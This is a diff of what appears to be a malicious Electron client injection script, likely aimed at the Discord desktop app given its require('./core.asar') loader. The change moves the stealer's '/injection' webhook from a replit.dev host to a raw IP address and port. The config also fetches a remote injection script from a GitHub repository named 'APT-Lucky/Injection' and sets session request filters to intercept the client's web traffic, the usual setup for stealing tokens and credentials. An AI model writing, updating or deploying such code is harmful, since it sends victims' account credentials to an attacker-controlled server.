@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://12c46603-e5d9-4a49-baf4-62272a1d45eb-00-2qyzmtgvna10i.picard.replit.dev/injection",
+    webhook: "http://217.114.43.194:144/injection",
     injection_url: "https://raw.githubusercontent.com/APT-Lucky/Injection/main/Injection.js",
     filters: {
         urls: [
@@ -552,3 +552,4 @@ session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, cal
 });
 
 module.exports = require("./core.asar");
+
